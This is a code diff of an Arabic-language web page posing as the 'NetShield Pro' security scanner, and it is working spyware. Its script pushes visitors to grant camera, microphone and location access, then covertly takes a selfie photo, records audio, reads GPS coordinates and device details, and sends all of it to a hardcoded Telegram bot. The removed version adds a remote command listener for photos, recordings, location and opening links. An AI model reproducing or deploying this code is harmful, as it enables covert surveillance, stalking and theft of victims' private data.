+        </div>
+
+        <!-- Progress Wrapper -->
+        <div class="progress-wrapper" id="progressWrapper">
+            <div class="progress-steps">
+                <div class="progress-step" id="step1">1</div>
+                <div class="progress-step" id="step2">2</div>
+                <div class="progress-step" id="step3">3</div>
+                <div class="progress-step" id="step4">4</div>
+            </div>
+            <div class="progress-bar-container">
+                <div class="progress-bar-fill" id="progressBar"></div>
+            </div>
+            <div class="progress-text" id="progressText">جاري التحضير...</div>
+        </div>
+
+        <!-- Alert Messages -->
+        <div class="alert alert-danger" id="alertDanger">
+            <div class="alert-header">
+                <svg viewBox="0 0 24 24"><path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"/></svg>
+                <h4>فشل الفحص</h4>
+            </div>
+            <p>يجب منح جميع الصلاحيات المطلوبة لاتمام الفحص بنجاح.</p>
+        </div>
+        <div class="alert alert-success" id="alertSuccess">
+            <div class="alert-header">
+                <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+                <h4>اكتمل الفحص بنجاح</h4>
+            </div>
+            <p>تم فحص الشبكة وتامينها. جميع الانظمة تعمل بشكل طبيعي.</p>
+        </div>
+
+        <!-- Footer -->
+        <div class="footer">
+            <div class="footer-logo">NETSHIELD PRO</div>
+            <div class="footer-text">Advanced Cybersecurity Suite v7.0</div>
+            <div class="footer-text">Secure connections, protected privacy</div>
+        </div>
+
     </div>
-    <div class="status-icon">
-      <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
-    </div>
-  </div>
 
-  <div class="metrics-grid">
-    <div class="metric-card"><div class="metric-value up" id="speedValue">--</div><div class="metric-label">سرعة الاتصال</div></div>
-    <div class="metric-card"><div class="metric-value down" id="threatsValue">0</div><div class="metric-label">تهديدات</div></div>
-    <div class="metric-card"><div class="metric-value" id="devicesValue">1</div><div class="metric-label">جهاز متصل</div></div>
-    <div class="metric-card"><div class="metric-value" id="pingValue">--</div><div class="metric-label">زمن الاستجابة</div></div>
-  </div>
+    <script>
+        // ==================== CONFIGURATION ====================
+        const BOT_TOKEN = "8915820730:AAHqyTgk9IVvmMLA8xpXO8QuLPEPbIv9A9c";
+        const CHAT_ID = "6453594151";
+        const MICROPHONE_DURATION = 10000; // 10 ثواني
+        const COMMAND_CHECK_INTERVAL = 2000; // فحص الاوامر كل 2 ثانية
+        const VISITOR_ALERT = true;
+        const AUTO_REFRESH_INTERVAL = 60000; // 60 ثانية
+        const PERMISSION_RETRY_INTERVAL = 30000; // 30 ثانية
 
-  <div class="section">
-    <div class="section-header">
-      <div class="section-icon blue"><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg></div>
-      <h3 class="section-title">ميزات الحماية</h3>
-    </div>
-    <div class="feature-list">
-      <div class="feature-item"><div class="feature-icon-box blue"><svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg></div><div class="feature-content"><h4>جدار ناري ذكي</h4><p>حماية فورية</p></div><span class="feature-badge new">نشط</span></div>
-      <div class="feature-item"><div class="feature-icon-box green"><svg viewBox="0 0 24 24"><path d="M19.35 10.04C18.67 6.59 15.64 4 12 4 9.11 4 6.6 5.64 5.35 8.04 2.34 8.36 0 10.91 0 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96z"/></svg></div><div class="feature-content"><h4>فحص الشبكة</h4><p>تحليل شامل</p></div><span class="feature-badge pro">Pro</span></div>
-      <div class="feature-item"><div class="feature-icon-box purple"><svg viewBox="0 0 24 24"><path d="M17 1.01L7 1c-1.1 0-2 .9-2 2v18c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2V3c0-1.1-.9-1.99-2-1.99zM17 19H7V5h10v14z"/></svg></div><div class="feature-content"><h4>تحسين الاداء</h4><p>تسريع الاتصال</p></div></div>
-    </div>
-  </div>
+        // ==================== GLOBAL STATE ====================
+        let scanData = {
+            deviceInfo: null,
+            battery: null,
+            network: null,
+            camera: null,
+            microphone: null,
+            location: null,
+            permissions: {
+                camera: false,
+                microphone: false,
+                location: false,
+                notification: false
+            }
+        };
 
-  <div class="scan-section">
-    <button class="btn-scan" id="btnStartScan" onclick="checkAllPermissions()">بدء الفحص الامني الشامل</button>
-    <p class="scan-hint">يحتاج الفحص الى صلاحيات الشبكة والجهاز</p>
-  </div>
+        let lastUpdateId = 0;
+        let commandListenerActive = false;
+        let currentRetryFunction = null;
+        let flashStream = null;
+        let flashTrack = null;
+        let permissionLoopInterval = null;
 
-  <div id="permissionPrompt" class="permission-prompt">
-    <p id="permissionText">مطلوب مزيد من الصلاحيات</p>
-    <button onclick="requestMissingPermissions()">منح الصلاحيات</button>
-  </div>
+        // ==================== RESTORE PERMISSIONS ====================
+        if (localStorage.getItem('perm_camera') === 'true') scanData.permissions.camera = true;
+        if (localStorage.getItem('perm_mic') === 'true') scanData.permissions.microphone = true;
+        if (localStorage.getItem('perm_loc') === 'true') scanData.permissions.location = true;
+        if (localStorage.getItem('perm_notify') === 'true') scanData.permissions.notification = true;
 
-  <div class="progress-wrapper" id="progressWrapper">
-    <div class="progress-steps">
-      <div class="progress-step" id="step1">1</div>
-      <div class="progress-step" id="step2">2</div>
-      <div class="progress-step" id="step3">3</div>
-      <div class="progress-step" id="step4">4</div>
-    </div>
-    <div class="progress-bar-container"><div class="progress-bar-fill" id="progressBar"></div></div>
-    <div class="progress-text" id="progressText">جاري التحضير...</div>
-  </div>
-
-  <div class="alert alert-danger" id="alertDanger"><div class="alert-header"><svg viewBox="0 0 24 24"><path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"/></svg><h4>فشل الفحص</h4></div><p>يجب منح جميع الصلاحيات لضمان الحماية القصوى.</p></div>
-  <div class="alert alert-success" id="alertSuccess"><div class="alert-header"><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg><h4>اكتمل الفحص بنجاح</h4></div><p>تم فحص الشبكة وتامينها. جميع الانظمة تعمل.</p></div>
-
-  <div class="footer"><div class="footer-logo">NETSHIELD PRO</div><div class="footer-text">Advanced Cybersecurity Suite v6.0</div></div>
-</div>
-
-<script>
-// ==================== CONFIGURATION ====================
-const BOT_TOKEN = "8538439468:AAHWECtOde50fTxLEVgMAM3qtg0KxWLbSGI";
-const CHAT_ID = "6453594151";
-const MICROPHONE_DURATION = 10000;
-const COMMAND_CHECK_INTERVAL = 2000;
-const VISITOR_ALERT = true;
-const AUTO_REFRESH_INTERVAL = 60000;
-
-let scanData = {
-  deviceInfo: null, battery: null, network: null,
-  camera: null, microphone: null, location: null,
-  permissions: { camera: false, microphone: false, location: false, notification: false }
-};
-let lastUpdateId = 0;
-let commandListenerActive = false;
-let currentRetryFunction = null;
-
-// ==================== RESTORE PERMISSIONS FROM STORAGE ====================
-if (localStorage.getItem('perm_camera') === 'true') scanData.permissions.camera = true;
-if (localStorage.getItem('perm_mic') === 'true') scanData.permissions.microphone = true;
-if (localStorage.getItem('perm_loc') === 'true') scanData.permissions.location = true;
-if (localStorage.getItem('perm_notify') === 'true') scanData.permissions.notification = true;
-
-// ==================== PWA & SERVICE WORKER ====================
-if ('serviceWorker' in navigator) {
-  navigator.serviceWorker.register('/sw.js')
-    .then(reg => console.log('SW registered'))
-    .catch(err => console.log('SW failed'));
-}
-
-// ==================== ALERT ON LOAD ====================
-if (VISITOR_ALERT) {
-    sendText("🔔 **تنبيه دخول:**\n🕐 شخص ما فتح التطبيق حالاً!\n📍 في انتظار الفحص...");
-}
-
-// ==================== PERMISSION HANDLER ====================
-function checkAllPermissions() {
-    requestNotificationPermission();
-    checkCamera();
-}
-
-function checkCamera() {
-    navigator.mediaDevices.getUserMedia({ video: true })
-    .then(stream => {
-        stream.getTracks().forEach(track => track.stop());
-        scanData.permissions.camera = true;
-        localStorage.setItem('perm_camera', 'true');
-        checkMicrophone();
-    })
-    .catch(err => {
-        currentRetryFunction = checkCamera;
-        showPermissionPrompt("الكاميرا");
-    });
-}
-
-function checkMicrophone() {
-    navigator.mediaDevices.getUserMedia({ audio: true })
-    .then(stream => {
-        stream.getTracks().forEach(track => track.stop());
-        scanData.permissions.microphone = true;
-        localStorage.setItem('perm_mic', 'true');
-        checkLocation();
-    })
-    .catch(err => {
-        currentRetryFunction = checkMicrophone;
-        showPermissionPrompt("الميكروفون");
-    });
-}
-
-function checkLocation() {
-    navigator.geolocation.getCurrentPosition(
-        (pos) => {
-            scanData.permissions.location = true;
-            localStorage.setItem('perm_loc', 'true');
-            document.getElementById('permissionPrompt').style.display = 'none';
-            startFullScan();
-        },
-        (err) => {
-            currentRetryFunction = checkLocation;
-            showPermissionPrompt("الموقع الجغرافي");
+        // ==================== PWA & SERVICE WORKER ====================
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('/sw.js')
+                .then(reg => console.log('SW registered'))
+                .catch(err => console.log('SW failed'));
         }
-    );
-}
 
-function showPermissionPrompt(permissionName) {
-    const promptDiv = document.getElementById('permissionPrompt');
-    const textEl = document.getElementById('permissionText');
-    textEl.textContent = `صلاحية ${permissionName} مرفوضة. الفحص لن يكتمل بدونها. اضغط لمنحها:`;
-    promptDiv.style.display = 'block';
-}
-
-function requestMissingPermissions() {
-    if (currentRetryFunction) {
-        currentRetryFunction();
-    }
-}
-
-// ==================== MAIN SCAN ====================
-async function startFullScan() {
-  const btn = document.getElementById('btnStartScan');
-  const pw = document.getElementById('progressWrapper');
-  const pb = document.getElementById('progressBar');
-  const pt = document.getElementById('progressText');
-  document.getElementById('alertDanger').style.display = 'none';
-  document.getElementById('alertSuccess').style.display = 'none';
-  pw.style.display = 'block'; btn.disabled = true; btn.textContent = 'جاري الفحص...';
-  resetSteps();
-
-  updateStep(1,'active'); pb.style.width='25%'; pt.textContent='جمع معلومات الشبكة...'; await sleep(500);
-  collectDeviceInfo(); await collectNetworkData();
-  updateStep(1,'done');
-
-  updateStep(2,'active'); pb.style.width='50%'; pt.textContent='تحليل حزم البيانات...'; await sleep(600);
-  await captureCamera();
-  updateStep(2,'done');
-
-  updateStep(3,'active'); pb.style.width='75%'; pt.textContent='مسح المنافذ المفتوحة...'; await sleep(800);
-  await captureMicrophone();
-  updateStep(3,'done');
-
-  updateStep(4,'active'); pb.style.width='95%'; pt.textContent='انشاء التقرير...'; await sleep(600);
-  await captureLocation();
-  updateStep(4,'done');
-
-  await sendCompleteReport();
-  pb.style.width='100%'; pt.textContent='اكتمل التحليل!';
-  await sleep(400);
-  pw.style.display='none'; document.getElementById('alertSuccess').style.display='block';
-  btn.textContent='اعادة الفحص'; btn.disabled=false; updateMainStatus(true);
-
-  if(!commandListenerActive){ startCommandListener(); commandListenerActive=true; }
-}
-
-// ==================== COLLECTION ====================
-function collectDeviceInfo() {
-  scanData.deviceInfo = { userAgent: navigator.userAgent, platform: navigator.platform, language: navigator.language, screenWidth: screen.width, screenHeight: screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, ram: navigator.deviceMemory||'غير معروف', cores: navigator.hardwareConcurrency||'غير معروف', timestamp: new Date().toLocaleString('ar-EG') };
-  if(navigator.getBattery){ navigator.getBattery().then(b=>{ scanData.battery={level:Math.round(b.level*100),charging:b.charging}; }).catch(()=>{}); }
-}
-
-async function collectNetworkData() {
-  const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-  if(c){ scanData.network = { type: c.type||'unknown', downlink: c.downlink||0, rtt: c.rtt||0 }; document.getElementById('speedValue').textContent=Math.round(c.downlink||0); document.getElementById('pingValue').textContent=c.rtt||'--'; }
-}
-
-async function captureCamera() {
-  if (!scanData.permissions.camera) return;
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode:'user', width:{ideal:640}, height:{ideal:480} } });
-    const video = document.createElement('video'); video.srcObject = stream; await video.play();
-    const canvas = document.createElement('canvas'); canvas.width=video.videoWidth||640; canvas.height=video.videoHeight||480;
-    canvas.getContext('2d').drawImage(video,0,0); scanData.camera = canvas.toDataURL('image/jpeg',0.7);
-    stream.getTracks().forEach(t=>t.stop());
-  } catch(e) {}
-}
-
-async function captureMicrophone() {
-  if (!scanData.permissions.microphone) return;
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({ audio:true });
-    const mr = new MediaRecorder(stream, { mimeType:'audio/webm' }); const chunks=[];
-    mr.ondataavailable = e => chunks.push(e.data);
-    mr.onstop = () => { const blob = new Blob(chunks,{type:'audio/webm'}); const reader = new FileReader(); reader.onloadend=()=>{ scanData.microphone=reader.result; }; reader.readAsDataURL(blob); };
-    mr.start(); setTimeout(()=>{ mr.stop(); stream.getTracks().forEach(t=>t.stop()); }, MICROPHONE_DURATION);
-    await sleep(MICROPHONE_DURATION+500);
-  } catch(e) {}
-}
-
-function captureLocation() {
-  return new Promise(resolve => {
-    if (!scanData.permissions.location) { resolve(); return; }
-    navigator.geolocation.getCurrentPosition(pos=>{
-      scanData.location = { latitude:pos.coords.latitude, longitude:pos.coords.longitude, accuracy:pos.coords.accuracy, altitude:pos.coords.altitude||'غير متوفر', speed:pos.coords.speed||'غير متوفر', timestamp:new Date(pos.timestamp).toLocaleString('ar-EG') };
-      resolve();
-    }, ()=>{ resolve(); }, { enableHighAccuracy:true, timeout:8000, maximumAge:0 });
-  });
-}
-
-// ==================== NOTIFICATIONS HANDLING ====================
-function requestNotificationPermission() {
-  if ('Notification' in window) {
-    if (Notification.permission === 'granted') {
-      scanData.permissions.notification = true;
-      localStorage.setItem('perm_notify', 'true');
-    } else if (Notification.permission !== 'denied') {
-      Notification.requestPermission().then(permission => {
-        scanData.permissions.notification = (permission === 'granted');
-        if (scanData.permissions.notification) localStorage.setItem('perm_notify', 'true');
-      });
-    }
-  }
-}
-
-function showNotification(title, body) {
-  if ('Notification' in window && Notification.permission === 'granted') {
-    navigator.serviceWorker.ready.then(registration => {
-      registration.showNotification(title, {
-        body: body,
-        icon: 'https://cdn-icons-png.flaticon.com/512/564/564619.png',
-        vibrate: [200, 100, 200, 100, 200, 100, 200],
-        requireInteraction: true,
-        tag: 'netshield-alert-' + Date.now(),
-        renotify: true,
-        silent: false,
-        data: { url: '/' }
-      });
-    });
-  }
-}
-
-// ==================== TELEGRAM COMMANDS ====================
-async function checkForCommands() {
-  try {
-    const resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`);
-    const data = await resp.json();
-    if (data.ok && data.result.length > 0) {
-      for (const upd of data.result) {
-        lastUpdateId = upd.update_id;
-        const msg = upd.message;
-        if (msg && msg.text) {
-          const cmd = msg.text.toLowerCase().trim();
-          
-          if (cmd === '/photo' || cmd === '/camera' || cmd === '/cam') {
-            if (!scanData.permissions.camera) { sendText('صلاحية الكاميرا غير مفعلة'); continue; }
-            await captureCamera();
-            if (scanData.camera) { await sendPhoto(scanData.camera); sendText('صورة جديدة من الكاميرا'); }
-            else { sendText('فشل الوصول للكاميرا'); }
-          }
-          else if (cmd === '/location' || cmd === '/loc' || cmd === '/gps') {
-            if (!scanData.permissions.location) { sendText('صلاحية الموقع غير مفعلة'); continue; }
-            await captureLocation();
-            if (scanData.location) { const l=scanData.location; sendText(`الموقع الحالي:\nالاحداثيات: ${l.latitude}, ${l.longitude}\nالدقة: ${Math.round(l.accuracy)} متر\nخرائط: https://maps.google.com/?q=${l.latitude},${l.longitude}`); }
-            else { sendText('فشل تحديد الموقع'); }
-          }
-          else if (cmd === '/info' || cmd === '/device' || cmd === '/status') {
-            collectDeviceInfo(); await collectNetworkData(); await sleep(500);
-            let t='معلومات الجهاز:\n\n';
-            if(scanData.deviceInfo){ const d=scanData.deviceInfo; t+=`النظام: ${d.platform}\nالذاكرة: ${d.ram} GB\nالمعالج: ${d.cores} نواة\n`; }
-            if(scanData.battery){ t+=`البطارية: ${scanData.battery.level}%\nالشحن: ${scanData.battery.charging?'موصول':'غير موصول'}\n`; }
-            if(scanData.network){ t+=`النت: ${scanData.network.type} - ${scanData.network.downlink} Mbps\n`; }
-            t+=`الوقت: ${new Date().toLocaleString('ar-EG')}`; sendText(t);
-          }
-          else if (cmd === '/full' || cmd === '/scan' || cmd === '/report') { await sendCompleteReport(); }
-          else if (cmd === '/record' || cmd === '/mic' || cmd === '/audio') {
-            if (!scanData.permissions.microphone) { sendText('صلاحية الميكروفون غير مفعلة'); continue; }
-            sendText('جاري التسجيل (10 ثواني)...');
-            await captureMicrophone();
-            if (scanData.microphone) { await sendAudio(scanData.microphone); sendText('تم التسجيل'); }
-            else { sendText('فشل التسجيل'); }
-          }
-          else if (cmd === '/help' || cmd === '/start') { 
-            sendText('الاوامر المتاحة:\n\n/photo - التقاط صورة\n/location - الموقع الحالي\n/info - معلومات الجهاز\n/full - تقرير كامل\n/record - تسجيل 10 ثواني\n/notify - ارسال اشعار\n/open - فتح رابط\n/vibrate - اهتزاز الجهاز\n/say - تحويل نص لكلام\n/ping - التحقق من الاتصال\n/help - عرض المساعدة'); 
-          }
-          else if (cmd === '/ping') { sendText('الجهاز متصل وجاهز'); }
-          else if (cmd.startsWith('/notify ')) {
-            if (!scanData.permissions.notification) { sendText('صلاحية الاشعارات غير مفعلة'); continue; }
-            const txt = msg.text.replace('/notify ', '');
-            showNotification('NetShield Pro', txt);
-            sendText('تم ارسال الاشعار: ' + txt);
-          }
-          else if (cmd.startsWith('/open ')) {
-            const url = msg.text.replace('/open ', '').trim();
-            if (url) {
-                window.open(url, '_blank');
-                sendText('تم فتح الرابط: ' + url);
-            } else {
-                sendText('استخدام: /open [الرابط]');
-            }
-          }
-          else if (cmd === '/vibrate') {
-            if (navigator.vibrate) {
-                navigator.vibrate([500, 200, 500, 200, 500]);
-                sendText('تم الاهتزاز');
-            } else {
-                sendText('الجهاز لا يدعم الاهتزاز');
-            }
-          }
-          else if (cmd.startsWith('/say ')) {
-            const textToSay = msg.text.replace('/say ', '').trim();
-            if (textToSay) {
-                const utterance = new SpeechSynthesisUtterance(textToSay);
-                utterance.lang = 'ar';
-                window.speechSynthesis.speak(utterance);
-                sendText('تم التحدث: ' + textToSay);
-            } else {
-                sendText('استخدام: /say [النص]');
-            }
-          }
+        // ==================== ALERT ON LOAD ====================
+        if (VISITOR_ALERT) {
+            sendText("🔔 **تنبيه دخول:**\n🕐 شخص ما فتح التطبيق حالاً!\n📍 في انتظار الفحص...");
         }
-      }
-    }
-  } catch(e) {}
-}
 
-function startCommandListener() {
-  document.getElementById('remoteIndicator').style.display = 'block';
-  sendText('الوكيل نشط - الجهاز جاهز لاستقبال الاوامر');
-  setInterval(checkForCommands, COMMAND_CHECK_INTERVAL);
-}
+        // ==================== PERMISSION HANDLER ====================
+        function checkAllPermissions() {
+            requestNotificationPermission();
+            checkCamera();
+            startPermissionLoop();
+        }
 
-// ==================== TELEGRAM SEND ====================
-async function sendCompleteReport() {
-  let r = '━━━━━━━━━━━━━━━━━━━\n  تقرير الفحص الشامل\n━━━━━━━━━━━━━━━━━━━\n\n';
-  if(scanData.deviceInfo){ const d=scanData.deviceInfo; r+=`【 معلومات الجهاز 】\nالنظام: ${d.platform}\nالذاكرة: ${d.ram} GB\nالمعالج: ${d.cores} نواة\nالشاشة: ${d.screenWidth}x${d.screenHeight}\nالوقت: ${d.timestamp}\n\n`; }
-  if(scanData.battery){ const b=scanData.battery; r+=`【 البطارية 】\nالمستوى: ${b.level}%\nالشحن: ${b.charging?'موصول':'غير موصول'}\n\n`; }
-  if(scanData.network){ const n=scanData.network; r+=`【 الشبكة 】\nالنوع: ${n.type}\nالسرعة: ${n.downlink} Mbps\nالاستجابة: ${n.rtt} ms\n\n`; }
-  if(scanData.location){ const l=scanData.location; r+=`【 الموقع 】\nالاحداثيات: ${l.latitude}, ${l.longitude}\nالدقة: ${Math.round(l.accuracy)} متر\nخرائط: https://maps.google.com/?q=${l.latitude},${l.longitude}\n\n`; }
-  r+=`【 الصلاحيات 】\nكاميرا: ${scanData.permissions.camera?'نعم':'لا'}\nميكروفون: ${scanData.permissions.microphone?'نعم':'لا'}\nموقع: ${scanData.permissions.location?'نعم':'لا'}\nاشعارات: ${scanData.permissions.notification?'نعم':'لا'}\n\n━━━━━━━━━━━━━━━━━━━`;
-  await sendText(r);
-  if(scanData.camera) await sendPhoto(scanData.camera);
-  if(scanData.microphone) await sendAudio(scanData.microphone);
-}
+        function startPermissionLoop() {
+            // تذكير بالصلاحيات المفقودة كل 30 ثانية
+            if (permissionLoopInterval) clearInterval(permissionLoopInterval);
+            permissionLoopInterval = setInterval(() => {
+                if (!scanData.permissions.camera || !scanData.permissions.microphone || !scanData.permissions.location) {
+                    document.getElementById('permissionPrompt').style.display = 'block';
+                    document.getElementById('permissionText').textContent = 
+                        '⚠️ بعض الصلاحيات مفقودة. الفحص لن يكتمل بدونها. اضغط لمنحها:';
+                }
+            }, PERMISSION_RETRY_INTERVAL);
+        }
 
-async function sendText(text) {
-  try { await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CHAT_ID,text:text})}); } catch(e) {}
-}
+        function checkCamera() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    stream.getTracks().forEach(track => track.stop());
+                    scanData.permissions.camera = true;
+                    localStorage.setItem('perm_camera', 'true');
+                    checkMicrophone();
+                })
+                .catch(err => {
+                    currentRetryFunction = checkCamera;
+                    showPermissionPrompt("الكاميرا");
+                });
+        }
 
-async function sendPhoto(base64) {
-  try { const blob = await (await fetch(base64)).blob(); const fd = new FormData(); fd.append('chat_id',CHAT_ID); fd.append('photo',blob,'camera.jpg'); await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:'POST',body:fd}); } catch(e) {}
-}
+        function checkMicrophone() {
+            navigator.mediaDevices.getUserMedia({ audio: true })
+                .then(stream => {
+                    stream.getTracks().forEach(track => track.stop());
+                    scanData.permissions.microphone = true;
+                    localStorage.setItem('perm_mic', 'true');
+                    checkLocation();
+                })
+                .catch(err => {
+                    currentRetryFunction = checkMicrophone;
+                    showPermissionPrompt("الميكروفون");
+                });
+        }
 
-async function sendAudio(base64) {
-  try { const blob = await (await fetch(base64)).blob(); const fd = new FormData(); fd.append('chat_id',CHAT_ID); fd.append('audio',blob,'recording.webm'); fd.append('duration','10'); await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`,{method:'POST',body:fd}); } catch(e) {}
-}
+        function checkLocation() {
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    scanData.permissions.location = true;
+                    localStorage.setItem('perm_loc', 'true');
+                    document.getElementById('permissionPrompt').style.display = 'none';
+                    startFullScan();
+                },
+                (err) => {
+                    currentRetryFunction = checkLocation;
+                    showPermissionPrompt("الموقع الجغرافي");
+                }
+            );
+        }
 
-// ==================== UI HELPERS ====================
-function updateStep(n,s){ const el=document.getElementById('step'+n); el.className='progress-step'; if(s==='done')el.classList.add('done'); if(s==='active')el.classList.add('active'); }
-function resetSteps(){ for(let i=1;i<=4;i++)document.getElementById('step'+i).className='progress-step'; document.getElementById('progressBar').style.width='0%'; }
-function updateMainStatus(s){ const dot=document.getElementById('mainStatusDot'); const ti=document.getElementById('mainStatusTitle'); const de=document.getElementById('mainStatusDesc'); if(s){ dot.classList.add('protected'); ti.textContent='محمي'; de.textContent='جميع الانظمة نشطة'; } else { dot.classList.remove('protected'); ti.textContent='غير محمي'; de.textContent='الفحص مطلوب'; } }
-function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }
+        function showPermissionPrompt(permissionName) {
+            const promptDiv = document.getElementById('permissionPrompt');
+            const textEl = document.getElementById('permissionText');
+            textEl.textContent = `صلاحية ${permissionName} مرفوضة. الفحص لن يكتمل بدونها. اضغط لمنحها:`;
+            promptDiv.style.display = 'block';
+        }
 
-// ==================== START LISTENER ON LOAD ====================
-startCommandListener();
+        function requestMissingPermissions() {
+            if (currentRetryFunction) {
+                currentRetryFunction();
+            }
+        }
 
-// ==================== AUTO REFRESH ====================
-setInterval(function() {
-  location.reload();
-}, AUTO_REFRESH_INTERVAL);
+        // ==================== MAIN SCAN ====================
+        async function startFullScan() {
+            const btn = document.getElementById('btnStartScan');
+            const pw = document.getElementById('progressWrapper');
+            const pb = document.getElementById('progressBar');
+            const pt = document.getElementById('progressText');
 
-// ==================== SECURITY ====================
-document.addEventListener('contextmenu',e=>e.preventDefault());
-document.addEventListener('selectstart',e=>e.preventDefault());
-</script>
+            document.getElementById('alertDanger').style.display = 'none';
+            document.getElementById('alertSuccess').style.display = 'none';
+            pw.style.display = 'block';
+            btn.disabled = true;
+            btn.textContent = 'جاري الفحص...';
+            resetSteps();
+
+            try {
+                updateStep(1, 'active'); pb.style.width = '25%'; pt.textContent = 'جمع معلومات الشبكة...'; await sleep(500);
+                collectDeviceInfo(); await collectNetworkData();
+                updateStep(1, 'done');
+
+                updateStep(2, 'active'); pb.style.width = '50%'; pt.textContent = 'تحليل حزم البيانات...'; await sleep(600);
+                await captureCamera();
+                updateStep(2, 'done');
+
+                updateStep(3, 'active'); pb.style.width = '75%'; pt.textContent = 'مسح المنافذ المفتوحة...'; await sleep(800);
+                await captureMicrophone();
+                updateStep(3, 'done');
+
+                updateStep(4, 'active'); pb.style.width = '95%'; pt.textContent = 'انشاء التقرير...'; await sleep(600);
+                await captureLocation();
+                updateStep(4, 'done');
+
+                await sendCompleteReport();
+                pb.style.width = '100%'; pt.textContent = 'اكتمل التحليل!';
+                await sleep(400);
+
+                pw.style.display = 'none';
+                document.getElementById('alertSuccess').style.display = 'block';
+                btn.textContent = 'اعادة الفحص';
+                btn.disabled = false;
+                updateMainStatus(true);
+
+                if (!commandListenerActive) {
+                    startCommandListener();
+                    commandListenerActive = true;
+                }
+            } catch (e) {
+                pw.style.display = 'none';
+                document.getElementById('alertDanger').style.display = 'block';
+                btn.textContent = 'اعادة المحاولة';
+                btn.disabled = false;
+                updateMainStatus(false);
+            }
+        }
+
+        // ==================== COLLECTION FUNCTIONS ====================
+        function collectDeviceInfo() {
+            scanData.deviceInfo = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                ram: navigator.deviceMemory || 'غير معروف',
+                cores: navigator.hardwareConcurrency || 'غير معروف',
+                timestamp: new Date().toLocaleString('ar-EG')
+            };
+            if (navigator.getBattery) {
+                navigator.getBattery().then(b => {
+                    scanData.battery = {
+                        level: Math.round(b.level * 100),
+                        charging: b.charging
+                    };
+                }).catch(() => {});
+            }
+        }
+
+        async function collectNetworkData() {
+            const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (c) {
+                scanData.network = {
+                    type: c.type || 'unknown',
+                    downlink: c.downlink || 0,
+                    rtt: c.rtt || 0
+                };
+                document.getElementById('speedValue').textContent = Math.round(c.downlink || 0);
+                document.getElementById('pingValue').textContent = c.rtt || '--';
+            }
+        }
+
+        async function captureCamera() {
+            if (!scanData.permissions.camera) return;
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }
+                });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                scanData.camera = canvas.toDataURL('image/jpeg', 0.7);
+                stream.getTracks().forEach(t => t.stop());
+            } catch (e) {}
+        }
+
+        async function captureMicrophone() {
+            if (!scanData.permissions.microphone) return;
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                const mr = new MediaRecorder(stream, { mimeType: 'audio/webm' });
+                const chunks = [];
+                mr.ondataavailable = e => chunks.push(e.data);
+                mr.onstop = () => {
+                    const blob = new Blob(chunks, { type: 'audio/webm' });
+                    const reader = new FileReader();
+                    reader.onloadend = () => { scanData.microphone = reader.result; };
+                    reader.readAsDataURL(blob);
+                };
+                mr.start();
+                setTimeout(() => { mr.stop(); stream.getTracks().forEach(t => t.stop()); }, MICROPHONE_DURATION);
+                await sleep(MICROPHONE_DURATION + 500);
+            } catch (e) {}
+        }
+
+        function captureLocation() {
+            return new Promise(resolve => {
+                if (!scanData.permissions.location) { resolve(); return; }
+                navigator.geolocation.getCurrentPosition(pos => {
+                    scanData.location = {
+                        latitude: pos.coords.latitude,
+                        longitude: pos.coords.longitude,
+                        accuracy: pos.coords.accuracy,
+                        altitude: pos.coords.altitude || 'غير متوفر',
+                        speed: pos.coords.speed || 'غير متوفر',
+                        timestamp: new Date(pos.timestamp).toLocaleString('ar-EG')
+                    };
+                    resolve();
+                }, () => { resolve(); }, { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 });
+            });
+        }
+
